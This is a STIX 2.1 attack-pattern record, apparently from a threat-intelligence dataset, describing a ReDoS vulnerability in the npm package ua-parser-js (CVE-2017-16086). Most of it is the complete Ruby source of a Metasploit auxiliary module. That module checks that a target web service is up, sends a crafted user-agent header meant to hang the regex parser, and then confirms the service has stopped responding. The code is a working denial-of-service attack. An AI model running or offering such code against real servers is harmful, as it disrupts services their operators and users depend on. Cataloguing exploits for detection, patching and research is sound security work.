{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b7860d8e-795e-4b58-9f77-3f87b3cb1fec",
    "created": "2024-08-14T16:26:09.75038Z",
    "modified": "2024-08-14T16:26:09.750384Z",
    "name": "ua-parser-js npm module ReDoS",
    "description": " This module exploits a Regular Expression Denial of Service vulnerability in the npm module \"ua-parser-js\". Server-side applications that use \"ua-parser-js\" for parsing the browser user-agent string will be vulnerable if they call the \"getOS\" or \"getResult\" functions. This vulnerability was fixed as of version 0.7.16.  'References'  => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/http/ua_parser_js_redos.rb",
            "external_id": "ua_parser_js_redos.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/faisalman/ua-parser-js/commit/25e143ee7caba78c6405a57d1d06b19c1e8e2f79"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Dos\n\n  def initialize\n    super(\n      'Name'        => 'ua-parser-js npm module ReDoS',\n      'Description' => %q{\n        This module exploits a Regular Expression Denial of Service vulnerability\n        in the npm module \"ua-parser-js\". Server-side applications that use\n        \"ua-parser-js\" for parsing the browser user-agent string will be vulnerable\n        if they call the \"getOS\" or \"getResult\" functions. This vulnerability was\n        fixed as of version 0.7.16.\n      },\n      'References'  =>\n        [\n          ['CVE', '2017-16086'],\n          ['URL', 'https://github.com/faisalman/ua-parser-js/commit/25e143ee7caba78c6405a57d1d06b19c1e8e2f79'],\n          ['CWE', '400'],\n        ],\n      'Author'      =>\n        [\n          'Ryan Knell,  Sonatype Security Research',\n          'Nick Starke, Sonatype Security Research',\n        ],\n      'License'     =>  MSF_LICENSE\n    )\n\n    register_options([\n      Opt::RPORT(80)\n    ])\n  end\n\n  def run\n    unless test_service\n      fail_with(Failure::Unreachable, \"#{peer} - Could not communicate with service.\")\n    else\n      trigger_redos\n      test_service_unresponsive\n    end\n  end\n\n  def trigger_redos\n    begin\n      print_status(\"Sending ReDoS request to #{peer}.\")\n\n      res = send_request_cgi({\n        'uri' => '/',\n        'method' => 'GET',\n        'headers' => {\n          'user-agent' => 'iphone os ' + (Rex::Text.rand_text_alpha(1) * 64)\n        }\n      })\n\n      if res.nil?\n        print_status(\"No response received from #{peer}, service is most likely unresponsive.\")\n      else\n        fail_with(Failure::Unknown, \"ReDoS request unsuccessful. Received status #{res.code} from #{peer}.\")\n      end\n\n    rescue ::Rex::ConnectionRefused\n      print_error(\"Unable to connect to #{peer}.\")\n    rescue ::Timeout::Error\n      print_status(\"No HTTP response received from #{peer}, this indicates the payload was successful.\")\n    end\n  end\n\n  def test_service_unresponsive\n    begin\n      print_status('Testing for service unresponsiveness.')\n\n      res = send_request_cgi({\n        'uri' => '/' + Rex::Text.rand_text_alpha(8),\n        'method' => 'GET'\n      })\n\n      if res.nil?\n        print_good('Service not responding.')\n      else\n        print_error('Service responded with a valid HTTP Response; ReDoS attack failed.')\n      end\n    rescue ::Rex::ConnectionRefused\n      print_error('An unknown error occurred.')\n    rescue ::Timeout::Error\n      print_good('HTTP request timed out, most likely the ReDoS attack was successful.')\n    end\n  end\n\n  def test_service\n    begin\n      print_status('Testing Service to make sure it is working.')\n\n      res = send_request_cgi({\n        'uri' => '/' + Rex::Text.rand_text_alpha(8),\n        'method' => 'GET'\n      })\n\n      if !res.nil? && (res.code == 200 || res.code == 404)\n        print_status('Test request successful, attempting to send payload')\n        return true\n      else\n        return false\n      end\n    rescue ::Rex::ConnectionRefused\n      print_error(\"Unable to connect to #{peer}.\")\n      return false\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}